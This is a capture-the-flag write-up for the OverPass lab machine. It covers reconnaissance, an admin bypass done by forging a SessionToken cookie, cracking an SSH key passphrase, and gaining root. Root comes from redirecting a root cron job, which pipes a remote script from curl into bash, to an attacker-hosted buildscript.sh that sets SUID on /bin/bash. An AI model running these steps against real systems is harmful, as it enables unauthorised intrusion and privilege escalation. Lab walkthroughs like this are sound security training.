# OverPass1 WriteUp

## Reconnaissance
First Thing First, let's find out how many ports we could find using nmap. 
```sh
nmap -sV -sC -oN nmap/initials [Machine_IP]
```
The result is:

1. 22/TCP SSH
2. 80/TCP HTTP

Open it using port 80 and it brought us to **Password Management** Download Page. Download the Go-Lang script. THe Script just tell us that it encrypt the password using ROT47 Caesar method.
Nothing is interesting, so let's just brute-force all hidden directories using gobuster.
```sh
gobuster dir -u [Machine_IP] -w [dirlist_path] php,js,html,py
``` 
Then we'll find an admin page, we have to insert the right password dan username to get access. If you look into the js file, you'll see that if we set a cookies as **SessionToken** with any value in it, we might get access as admin.
```sh
curl [Machine_IP] --cookie "SessionToken=Anything"
```
And we got access.

Inside, it tell us that there's a user named james and an rsa key. so lets just copy it, find the passphrase, then use it as out ssh access in port 22 (if possible)
## PassPhrase Hash Using Ssh2john
so, we have rsa key, save it as **id_rsa**, and let's bruteforce to find the passphrase using ssh2john
```sh
sudo ssh2john id_rsa > rsa.txt
```
then let's find what is the passphrase that have same hash as our hashed rsa.txt file
```sh
john --wordlist=/usr/share/wordlists/rockyou.txt rsa.txt
```
it will return us a **james13** string, which we could use to connect via ssh remote access.
```sh
ssh -i id_rsa james@[Machine_IP]
```
and insert james13 as PassPhrase, and we gain access through ssh.

## Privilage Escalation Attempt
After we get access as james via ssh remote access,the next attempt will be finding "hole", which we can exploit to gain privillage escalation as root. As always, try s**sudo -l**, suid permition, etc. But we found nothing. So, let's check if there is an automation that being run by the system using **crontab** and ran by root.
```sh
cat /etc/crontab
```
The result is:
```sh
# m h dom mon dow user  command
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
# Update builds from latest code
* * * * * root curl overpass.thm/downloads/src/buildscript.sh | bash
```
it runs buildscirpt.sh in bash, as root in every minute. Now let's seek more information using **linpeas**. 
You can download it from [here](https://github.com/carlospolop/PEASS-ng/releases/download/20230129/linpeas.sh). Then create a file named linpeas.sh, add executable permission, then run it.

After the process has done, we see that overpass.thm is running in localhost, so let's see if we can change the address to our machine, getting a connection, and run our modified **buildscript.sh** which giving us access to bash as root.
```sh
╔══════════╣ Hostname, hosts and DNS
overpass-prod                                                                                
127.0.0.1 localhost
127.0.1.1 overpass-prod
127.0.0.1 overpass.thm
#change overpass.thm ip to your tun0 ip
```
When we get to *Interesting writable files owned by me or writable by everyone (not in Home) (max 500)* section:
```sh
/dev/mqueue                                                                            
/dev/shm
/etc/hosts
/home/james
#etc....
```
we could modify hosts address. So let's just change it to our tun0 IP adn create /download/src/**buildscript.sh** script:
```sh
#buildscript.sh script
chmod +s /bin/bash
```
create a simple server using python:
```sh
#in our machine
sudo python3 -m http.server 80
```
After we did it, let's keep checking on our permission to bash using ls -la after the minute change.
```sh
#it will change like this
-rwsr-sr-x 1 root root 1113504 Jun  6  2019 /bin/bash
```
After a minute, the /bin/bash access will change and if we do the **bash -p** command, we could access bash as root. got to root directory and we'll find out last flag which is **root.txt**

